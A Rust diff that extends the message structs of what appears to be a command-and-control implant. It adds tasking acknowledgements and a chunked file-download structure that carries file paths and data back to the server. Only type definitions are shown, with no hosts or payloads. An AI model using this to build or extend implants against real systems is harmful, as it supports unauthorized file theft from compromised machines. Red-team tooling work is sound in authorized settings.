@@ -52,6 +52,8 @@ pub struct GetTasking {
 #[derive(Deserialize)]
 pub struct TaskingReply {
     #[serde(default)]
+    pub responses: Vec<ResponseAck>,
+    #[serde(default)]
     pub tasks: Vec<Task>,
     #[serde(default)]
     pub socks: Vec<ProxyPacket>,
@@ -59,6 +61,17 @@ pub struct TaskingReply {
     pub rpfwd: Vec<ProxyPacket>,
     #[serde(default)]
     pub delegates: Vec<Delegate>,
+}
+
+#[derive(Deserialize)]
+pub struct ResponseAck {
+    pub task_id: String,
+    #[serde(default)]
+    pub status: String,
+    #[serde(default)]
+    pub error: String,
+    #[serde(default)]
+    pub file_id: String,
 }
 
 #[derive(Deserialize)]
@@ -72,7 +85,30 @@ pub struct Task {
 #[derive(Clone, Serialize)]
 pub struct TaskResponse {
     pub task_id: String,
-    pub completed: bool,
-    pub status: String,
-    pub user_output: String,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub completed: Option<bool>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub status: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub user_output: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub download: Option<Download>,
+}
+
+#[derive(Clone, Serialize)]
+pub struct Download {
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub total_chunks: Option<u32>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub full_path: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub filename: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub chunk_size: Option<u32>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub chunk_num: Option<u32>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub file_id: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub chunk_data: Option<String>,
 }
